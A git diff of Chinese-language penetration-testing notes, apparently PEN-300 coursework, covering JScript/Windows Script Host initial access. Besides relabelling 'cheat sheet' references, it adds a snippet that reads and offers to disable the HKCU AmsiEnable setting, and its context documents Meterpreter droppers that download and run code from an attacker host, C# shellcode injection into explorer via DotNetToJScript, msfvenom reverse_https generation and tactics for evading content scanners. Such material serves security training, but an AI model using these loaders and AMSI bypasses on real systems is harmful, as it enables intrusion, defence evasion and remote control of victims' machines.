@@ -6,6 +6,8 @@
 
 > **覆盖场景：** 9–10
 >
+> **教材依据：** 第 7 章（§7.1 JScript Dropper、§7.2 JScript 与 C# / DotNetToJScript / SharpShooter）、第 9 章（§9.1.2 客户端反射 C#）、第 12 章（§12.6 JScript AMSI 绕过）
+>
 > **前置依赖：** 目标保留 Windows Script Host（`cscript` / `wscript`）；目标装有 .NET Framework（2.0/3.5 或 4.x）；攻击机有 `msfvenom`、HTTP 服务与 MSF 监听；一台能运行 .NET 的工具机用于生成 DotNetToJScript / SuperSharpShooter 产物（Windows 或 Linux + mono/python）
 
 ## 背景速览：WSH 为什么能绕开"EXE 受限"
@@ -85,7 +87,7 @@
  * 用途：C# 第二阶段载荷——[ComVisible] 类，构造时把 shellcode 注入指定进程。
  *      由 DotNetToJScript / SuperSharpShooter 序列化进 JScript，在 WSH 进程内
  *      反序列化激活本类构造函数，全程不落地 EXE（场景 9 主线）。
- * 场景：9、10（cheat sheet JScript > Meterpreter Loader with DotNetToJScript）
+ * 场景：9、10（速查笔记 JScript > Meterpreter Loader with DotNetToJScript）
  * 依赖：.NET Framework SDK 的 csc.exe（工具机 Windows 编译）；
  *      运行时目标需对应 CLR 版本（v4 默认）。注入目标进程须存在且位数匹配。
  * 使用：
@@ -98,7 +100,7 @@
  *  4) 生成桥接 JS 并投递（见 docs/03 场景 9 步骤 3）：
  *       DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
  * 占位符：PAYLOAD（msfvenom -f csharp 的字节）、TARGET_PROCESS（默认 explorer）
- * 测试状态：未编译/未实测；代码结构与 cheat sheet TestClass.cs 一致，
+ * 测试状态：未编译/未实测；代码结构与 速查笔记 TestClass.cs 一致，
  *     需在工具机编译 + 实验靶机验证后使用。
  */
 
@@ -222,6 +224,15 @@ try {
 
 // 已知被 AMSI 特征标记的字符串（实验目的，不是载荷本体）：
 // 该内容本身不应被执行出任何效果，只用于观察是否被拦截。
+// (A.2) PEN-300 §12.6 检查/设置 HKCU AmsiEnable 注册表项
+var amsiRegPath = "HKCU\\Software\\Microsoft\\Windows Script Host\\Settings\\AmsiEnable";
+try {
+    var curAmsi = shell.RegRead(amsiRegPath);
+    WScript.Echo("  HKCU AmsiEnable: " + curAmsi + " (0=已禁用WSH AMSI)");
+} catch (eReg) {
+    WScript.Echo("  HKCU AmsiEnable: 未设置 (默认启用; 可用 shell.RegWrite(amsiRegPath, 0, 'REG_DWORD') 禁用)");
+}
+
 var EVAL_TEST_CONTENT = "var x = 'Invoke-Mimikatz';"; // 可替换为你想投递内容的"最小特征片段"
 try {
     eval(EVAL_TEST_CONTENT);
@@ -247,7 +258,7 @@ WScript.Quit(0);
  * 用途：最小 JScript 下载器——从攻击机 HTTP 拉取文件到目标并保存；可选再执行。
  *      对应场景 9/10 的"脚本入口可用"时的传输层：下载第二阶段脚本/数据，
  *      避免把攻击逻辑写进附件正文（场景 10 的 A/B 分离阶段 A）。
- * 场景：9、10（cheat sheet JScript > Simple Meterpreter Dropper）
+ * 场景：9、10（速查笔记 JScript > Simple Meterpreter Dropper）
  * 依赖：Windows Script Host（cscript / wscript）、目标可访问攻击机 HTTP；
  *      MSXML2.XMLHTTP 与 ADODB.Stream 为系统自带组件。
  * 使用：
@@ -257,7 +268,7 @@ WScript.Quit(0);
  * 占位符：URL=http://LHOST/PAYLOAD   DROP_PATH=C:\Users\Public\PAYLOAD
  *      RUN_AFTER_DOWNLOAD=0/1（1 时用新 cscript 进程执行下载的 .js，用于 A/B 分离）
  * 测试状态：JS 语法已用 node --check 校验；未在 Windows WSH 实测，
- *     结构照抄 cheat sheet Simple Meterpreter Dropper，需在实验环境验证。
+ *     结构照抄 速查笔记 Simple Meterpreter Dropper，需在实验环境验证。
  * 注意：本文件只下载并(可选)执行你自己托管的授权测试文件。
  */
 
@@ -310,7 +321,7 @@ WScript.Quit(0);
  *      DotNetToJScript.exe 会把 C# 程序集序列化生成完整 runner.js（几百行 base64），
  *      本文件用于：(a) 记录标准生成命令；(b) 在投递前做宿主位数/.NET 预检；
  *      (c) 需要手工拼装时，把工具输出整体粘贴到下方"粘贴区"。
- * 场景：9、10（cheat sheet JScript > Meterpreter Loader with DotNetToJScript）
+ * 场景：9、10（速查笔记 JScript > Meterpreter Loader with DotNetToJScript）
  * 依赖：工具机 Windows + DotNetToJScript.exe；目标 WSH + .NET（v4 或 v2）。
  * 使用：
  *  1) 生成完整产物（产物本身可独立运行，无需本文件）：
@@ -368,7 +379,7 @@ WScript.Quit(0);
  *      附件只含本文件（正文干净）；运行时读取同目录/指定路径的 payload.js
  *      （SuperSharpShooter 生成的第二阶段）并执行。用于在靶机上快速换产物测试，
  *      以及验证"A/B 分离 + 换新进程"是否躲过内容扫描。
- * 场景：10、9 备选（cheat sheet JScript > Meterpreter with SuperSharpShooter）
+ * 场景：10、9 备选（速查笔记 JScript > Meterpreter with SuperSharpShooter）
  * 依赖：目标 WSH；payload.js 由 SuperSharpShooter 生成（工具机 python 即可）：
  *      msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f raw -o shell.bin
  *      ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.bin --payload js --output payload
